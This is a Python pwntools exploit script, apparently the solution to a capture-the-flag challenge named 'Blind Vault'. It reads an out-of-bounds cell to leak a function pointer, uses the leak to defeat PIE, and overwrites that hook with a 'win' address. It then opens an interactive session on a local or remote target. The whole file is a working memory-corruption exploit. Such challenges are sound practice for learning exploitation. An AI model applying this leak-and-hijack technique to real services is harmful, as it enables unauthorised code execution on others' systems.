#!/usr/bin/env python3
import os
from pathlib import Path

from pwn import *

HOST, PORT = args.HOST or "127.0.0.1", int(args.PORT or 5001)
CHALLENGE_DIR = Path(__file__).resolve().parent.parent
path = str(args.BIN or CHALLENGE_DIR / "dist" / "vault")
debug_path = str(args.DEBUG or Path(__file__).resolve().parent / "vault.debug")

if not os.path.exists(path):
    log.error(f"binary tidak ditemukan: {path}. Build atau salin binary ke dist/vault, atau gunakan BIN=/path/ke/vault.")

elf = ELF(path, checksec=False)
context.binary = elf
dbg = ELF(debug_path, checksec=False) if os.path.exists(debug_path) else elf

def sym(name):
    value = args.get(name.upper() + "_OFF")
    if value: return int(value, 0)
    if name in dbg.symbols: return dbg.symbols[name]
    log.error(f"{name} offset missing; provide {name.upper()}_OFF=0x... or vault.debug")

quiet = sym("quiet")
win = sym("win")
io = remote(HOST, PORT) if args.REMOTE else process(path)
io.recvuntil(b"== Blind Vault ==")

def read_cell(index):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(index).encode())
    line = io.recvline()
    return int(line.split(b"0x", 1)[1], 16)

def write_cell(index, value):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(index).encode())
    io.sendlineafter(b"value: ", f"{value:x}".encode())
    io.recvuntil(b"written")

# cells[8] is the seal and cells[9] is the hook: index 9 is OOB.
quiet_leak = read_cell(9)
pie = quiet_leak - quiet
target = pie + win
log.info(f"quiet leak: {quiet_leak:#x}")
log.info(f"PIE base:    {pie:#x}")
log.info(f"win address: {target:#x}")

write_cell(9, target)
io.sendlineafter(b"> ", b"3")
io.interactive()
